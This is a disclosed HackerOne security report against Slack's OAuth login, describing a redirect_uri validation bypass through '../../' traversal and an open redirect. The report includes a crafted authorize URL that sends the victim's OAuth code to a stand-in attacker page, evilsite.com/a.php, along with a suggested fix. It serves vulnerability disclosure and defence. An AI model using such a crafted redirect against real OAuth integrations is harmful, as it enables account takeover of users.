---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '2559'
original_report_id: '2559'
title: Broken Authentication (including Slack OAuth bugs)
weakness: Violation of Secure Design Principles
team_handle: slack
created_at: '2014-03-01T11:56:40.224Z'
disclosed_at: '2014-08-30T07:19:16.157Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- violation-of-secure-design-principles
---

# Broken Authentication (including Slack OAuth bugs)

## Metadata

- HackerOne Report ID: 2559
- Weakness: Violation of Secure Design Principles
- Program: slack
- Disclosed At: 2014-08-30T07:19:16.157Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi,

Hope you are doing good!
Please have a look at the below report.
Description:
OAuth Framework Flaw Bypassing redirect_uri validation 
An attacker to exploit this Flaw just needs to find a open redirection flaw in the site which is using Slack's OAuth for logins.

Impact:
A malicious user can steal "code" parameter value assigned by Slack OAuth and can hijack victim's account by writing the value in a text file on his evilsite.com/a.php file.
Steps to reproduce:
1) Go to any web app which is using Slack's  OAuth and click on Login with Slack 
2) You will be redirected to this URL
https://slack.com/oauth/authorize?client_id=...&scope=read,post&redirect_uri=https://www.givensite.com/../../redirect_url=https://www.evilsite.com/a.php%2Fcomplete
Note i am bypassing the redirect_uri validation by using ../../ 
In the above URL,i have changed the value of redirect_uri to ../../redirect_url=https://www.evilsite.com/a.php and this should not happen.

The response will be 
http://givensite.com/redirect_url=https:/www.evilsite.com/a.php/complete?code=AQCbhUg1FiEQf5TyTesMgjP8zq

And then in the final step code value or access_token value will be written in my a.php file,the malicious guy will scrap it from the URL.
So,then he can login into the victim account using code value.
Please put proper validation on redirect_uri parameter.

The redirect_uri value should exactly match as defined in the application and the user to not be allowed to change it to the subdirectories etc.

This means if redirect_uri value is https://www.google.com then it should take the value https://www.google.com not https://www.google.com/a/x


Looking forward to hear from you,

Best regards,
Anand

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
